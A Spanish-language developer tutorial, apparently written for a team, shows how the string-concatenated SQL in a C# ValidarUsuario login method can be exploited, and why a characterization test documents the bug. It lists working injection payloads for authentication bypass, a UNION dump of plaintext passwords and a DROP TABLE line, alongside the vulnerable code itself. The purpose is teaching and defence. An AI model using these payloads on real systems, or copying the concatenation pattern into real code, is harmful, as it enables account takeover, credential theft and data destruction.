# 🎯 EJEMPLOS PRÁCTICOS: Cómo Explotar el SQL Injection en ValidarUsuario

## ⚠️ ADVERTENCIA LEGAL

Este documento es **SOLO CON PROPÓSITO EDUCATIVO** para entender por qué documentar este bug es crítico. No debe usarse para atacar sistemas. El conocimiento de vulnerabilidades es responsabilidad del desarrollador.

---

## 📋 TABLA DE ATAQUES COMUNES

| Ataque | Entrada | Resultado | Impacto |
|--------|---------|-----------|---------|
| Bypass OR | `' OR '1'='1' --` | Primer usuario | ✅ Acceso admin |
| Admin Específico | `admin' --` | Usuario admin | ✅ Acceso admin |
| Comment Escape | `admin' #` | Usuario admin | ✅ Acceso admin |
| Inyección UNION | `' UNION SELECT ...` | Datos otros usuarios | 🔓 Extracción datos |
| Batch Query | `'; DROP TABLE ...` | Tabla eliminada | 💥 Destrucción datos |

---

## 🔴 ATAQUE #1: Bypass Clásico (OR Injection)

### ¿Qué pasa?

El atacante envía:
```
NombreUsuario: ' OR '1'='1' --
Contraseña: (cualquiera)
```

### SQL Generado

```csharp
string nombreUsuario = "' OR '1'='1' --";
string contrasena = "xyz";

string sql = "SELECT * FROM Usuarios WHERE NombreUsuario = '" + nombreUsuario 
           + "' AND Contrasena = '" + contrasena + "' AND Activo = 1";

// Resultado:
// SELECT * FROM Usuarios 
// WHERE NombreUsuario = '' OR '1'='1' -- ' 
// AND Contrasena = 'xyz' 
// AND Activo = 1
```

### Análisis del SQL

```sql
SELECT * FROM Usuarios 
WHERE NombreUsuario = ''              ← FALSO (cadena vacía)
   OR '1'='1'                          ← VERDADERO (siempre)
   -- ' AND Contrasena = 'xyz' ...   ← COMENTARIO (ignorado)
```

**Lógica booleana:**
```
FALSO OR VERDADERO = VERDADERO
```

### Resultado en BD

```sql
-- La consulta retorna:
SELECT * FROM Usuarios 
WHERE VERDADERO AND Activo = 1

-- Equivale a:
SELECT * FROM Usuarios 
WHERE Activo = 1

-- Retorna TODOS los usuarios activos
-- El código hace: if (reader.Read())
-- Se obtiene el PRIMER usuario (usualmente Admin)
```

### Código C# que Recibe

```csharp
Usuario u = new Usuario();
u.Id = (int)reader["Id"];                    // ← ID del admin
u.NombreUsuario = reader["NombreUsuario"];   // ← "admin"
u.Rol = (int)reader["Rol"];                  // ← 3 (admin)
u.Activo = (bool)reader["Activo"];           // ← true

return u;  // ← ¡ATACANTE ES ADMIN!
```

---

## 🔴 ATAQUE #2: Acceso Como Usuario Específico

### ¿Qué pasa?

El atacante sabe que existe "admin" y accede sin contraseña:

```
NombreUsuario: admin' --
Contraseña: (cualquiera)
```

### SQL Generado

```csharp
string nombreUsuario = "admin' --";
string contrasena = "noexiste";

string sql = "SELECT * FROM Usuarios WHERE NombreUsuario = '" + nombreUsuario 
           + "' AND Contrasena = '" + contrasena + "' AND Activo = 1";

// Resultado:
// SELECT * FROM Usuarios 
// WHERE NombreUsuario = 'admin' -- ' AND Contrasena = 'noexiste' ...
```

### Análisis del SQL

```sql
SELECT * FROM Usuarios 
WHERE NombreUsuario = 'admin'   ← VERDADERO (existe admin)
-- ' AND Contrasena = 'noexiste' ...  ← COMENTARIO (ignorado)
```

**El resto de la condición es comentado y no se evalúa.**

### Resultado

```sql
SELECT * FROM Usuarios 
WHERE NombreUsuario = 'admin' 
AND Activo = 1

-- Retorna el usuario admin, SIN validar contraseña
```

---

## 🔴 ATAQUE #3: UNION Injection (Extracción de Datos)

### ¿Qué pasa?

El atacante quiere ver todas las contraseñas:

```
NombreUsuario: ' UNION SELECT * FROM Usuarios --
Contraseña: (cualquiera)
```

### SQL Generado

```sql
SELECT * FROM Usuarios 
WHERE NombreUsuario = '' 
   UNION SELECT * FROM Usuarios -- ' AND Contrasena = ...
```

### Análisis

```sql
-- Parte 1: No devuelve nada (NombreUsuario = '')
SELECT * FROM Usuarios WHERE NombreUsuario = ''

-- UNION: Combina resultados
UNION 

-- Parte 2: Devuelve TODOS los usuarios
SELECT * FROM Usuarios
```

**Resultado:** Se retornan TODOS los usuarios activos con todas sus contraseñas en texto plano.

### Impacto

```csharp
// El código hace:
if (reader.Read())  // ← Hay múltiples filas
{
    u = new Usuario();
    u.Id = (int)reader["Id"];
    u.NombreUsuario = reader["NombreUsuario"];  // ← Se obtiene primero
    // ...
    return u;  // ← Se retorna primero usuario
}

// PERO: En logs o debugging, podrías iterar:
// mientras (reader.Read()) {
//     Console.WriteLine(reader["NombreUsuario"] + ":" + reader["Contrasena"]);
// }
// TODAS LAS CONTRASEÑAS EXPUESTAS
```

---

## 💥 ATAQUE #4: Batch Query / Multiple Statements (Destructivo)

### ¿Qué pasa?

El atacante quiere destruir la tabla de usuarios:

```
NombreUsuario: '; DROP TABLE Usuarios; --
Contraseña: (cualquiera)
```

### SQL Generado

```csharp
string nombreUsuario = "'; DROP TABLE Usuarios; --";

string sql = "SELECT * FROM Usuarios WHERE NombreUsuario = '" + nombreUsuario 
           + "' AND Contrasena = '...' AND Activo = 1";

// Resultado:
// SELECT * FROM Usuarios 
// WHERE NombreUsuario = ''; DROP TABLE Usuarios; -- ' AND ...
```

### Análisis

```sql
-- Comando 1:
SELECT * FROM Usuarios 
WHERE NombreUsuario = ''  ← No devuelve nada

-- Comando 2 (ejecutado por Batch Query):
DROP TABLE Usuarios;      ← ELIMINA LA TABLA COMPLETA

-- Comando 3 (nunca se ejecuta, tabla ya no existe):
-- (comentado)
```

### Impacto

```
✅ Toda la tabla Usuarios eliminada
✅ Sistema de autenticación inoperativo
✅ Otros usuarios no pueden entrar
✅ Datos históricos de auditoría perdidos
✅ Copia de seguridad corrompida si se ejecutó en producción
```

---

## 🔐 TEST QUE CAPTURA ESTE BUG

```csharp
[Fact]
public void ValidarUsuario_BUG_ContrasenasEnTextoPlanoYSQLInjection()
{
    // Arrange - Simulamos entrada legítima
    string nombreUsuario = "admin";
    string contrasena = "password123";

    // Act - Reconstruimos el SQL que genera el código
    string sqlReconstruida = "SELECT * FROM Usuarios WHERE NombreUsuario = '" 
        + nombreUsuario + "' AND Contrasena = '" + contrasena + "' AND Activo = 1";

    // Assert - Verificamos que contiene las vulnerabilidades
    Assert.Contains("Usuarios", sqlReconstruida);
    Assert.Contains("Contrasena = '", sqlReconstruida);
    
    // DOCUMENTACIÓN: Explicitamente documenta QUÉ ESTÁ MAL
    // BUG 1: SQL Injection - la contraseña va sin parámetros parametrizados
    // BUG 2: Contraseñas en texto plano en BD
    // ATAQUE POSIBLE: nombreUsuario = "' OR '1'='1"
    // RESULTADO: SELECT * FROM Usuarios WHERE NombreUsuario = '' OR '1'='1' -- ...
    // IMPACTO: Bypass de autenticación
}
```

### ¿Por Qué Este Test Documenta el Bug?

1. **No usa mocks** - Reconstruye el SQL real que se genera
2. **Es descriptivo** - El nombre y comentarios explican QUÉ está mal
3. **Es reproducible** - Cualquiera puede entender el ataque
4. **Protege contra regresiones** - Si alguien "arregla" mal, el test lo atrapa

---

## 🛡️ CÓMO VERIFICAR QUE TU CÓDIGO ESTÁ VULNERADO

### Test Manual (Para tu entorno local)

```csharp
// NO HAGAS ESTO EN PRODUCCIÓN
[Fact]
public void Prueba_Vulnerabilidad_Localmente()
{
    // Usa una BD de prueba AISLADA
    var ataques = new[]
    {
        "' OR '1'='1' --",
        "admin' --",
        "admin' #",
        "' OR 1=1 --"
    };
    
    foreach (var ataque in ataques)
    {
        // Intenta entrar con la inyección
        var resultado = AccesoDatos.ValidarUsuario(ataque, "cualquiera");
        
        if (resultado != null)
        {
            // ¡VULNERABLE! Se obtiene usuario sin contraseña
            Console.WriteLine($"VULNERABLE: {ataque} → Usuario: {resultado.NombreUsuario}");
        }
    }
}
```

---

## 📊 MATRIX DE RIESGO

### Sin el Test (Estado Actual)

```
Tiempo: Hoy
Desarrollador: Nuevo
Acción: "Voy a limpiar la autenticación"

Escenario 1: Arregla bien
  ✅ Código mejorado, sin test que guíe
  ⚠️ Otros módulos se adaptan, desconocen vulnerabilidad anterior

Escenario 2: Arregla mal
  ❌ Código sigue vulnerable, pero cambiado
  ❌ Nadie se da cuenta
  ❌ Vulnerabilidad persiste
```

### Con el Test (Estado Ideal)

```
Tiempo: Hoy
Desarrollador: Nuevo
Acción: "Voy a limpiar la autenticación"

Escenario 1: Refactoriza bien
  ✅ Código mejorado
  ✅ Test se actualiza
  ✅ CI/CD verifica que la vulnerabilidad está arreglada

Escenario 2: Refactoriza mal
  ❌ Código cambió
  🔴 TEST SE VUELVE ROJO
  ✅ Error detectado ANTES de deploy
  ✅ Necesita revision
```

---

## 🔧 DEMOSTRACIÓN INTERACTIVA

### Paso 1: Entrada Normal (Sin Inyección)

```csharp
string nombreUsuario = "admin";
string contrasena = "correcto";

// SQL Generado:
// SELECT * FROM Usuarios 
// WHERE NombreUsuario = 'admin' 
// AND Contrasena = 'correcto' 
// AND Activo = 1

// Resultado: Usuario admin si contraseña coincide
```

### Paso 2: Con Inyección SQL

```csharp
string nombreUsuario = "admin' --";
string contrasena = "incorrecto";

// SQL Generado:
// SELECT * FROM Usuarios 
// WHERE NombreUsuario = 'admin' -- ' 
// AND Contrasena = 'incorrecto' 
// AND Activo = 1

// El -- comenta el resto
// Resultado: Usuario admin SIN validar contraseña
```

### Comparativa Lado a Lado

```
┌─ ENTRADA NORMAL ─────────┬─ ENTRADA CON INYECCIÓN ──┐
│ Usuario: admin           │ Usuario: admin' --        │
│ Contraseña: correct      │ Contraseña: cualquiera   │
│                          │                          │
│ SQL: WHERE user='admin'  │ SQL: WHERE user='admin' --│
│      AND pass='correct'  │      (resto ignorado)    │
│                          │                          │
│ Resultado: Acceso si ok  │ Resultado: Acceso SIN PW │
└──────────────────────────┴──────────────────────────┘
```

---

## 🎓 LECCIÓN: POR QUÉ DOCUMENTAR

### El Test Dice Más Que Código

**Sin test:**
```csharp
public static Usuario ValidarUsuario(string nombreUsuario, string contrasena)
{
    string sql = "SELECT * FROM Usuarios WHERE NombreUsuario = '" + nombreUsuario 
               + "' AND Contrasena = '" + contrasena + "' AND Activo = 1";
    // ¿Está bien? ¿Es seguro? ¿Qué hace exactamente?
}
```

**Con test:**
```csharp
[Fact]
public void ValidarUsuario_BUG_ContrasenasEnTextoPlanoYSQLInjection()
{
    // ¡CLARO! El test explica:
    // 1. QUÉ HACE el código (SQL concatenado)
    // 2. POR QUÉ ES MALO (vulnerable a injection)
    // 3. QUÉ ATAQUES FUNCIONAN (examples específicos)
    // 4. CUÁL ES EL IMPACTO (bypass de autenticación)
}
```

---

## ✅ CONCLUSIÓN

Este bug es **CRÍTICO** porque:

1. 🔴 **Está en autenticación** - El punto más sensible
2. 💥 **Es fácil de explotar** - 5 caracteres vs contraseña de 20
3. 🔓 **Acceso total** - No solo data, sino admin del sistema
4. 📊 **Impacto máximo** - Sistema completo comprometido
5. 🧪 **Es fácil de documentar** - El test capta el comportamiento

**Por eso el Characterization Test es importante:** Documenta que está vulnerable HOY, para que cuando lo arregles MAÑANA, tengas prueba de que lo arreglaste bien.

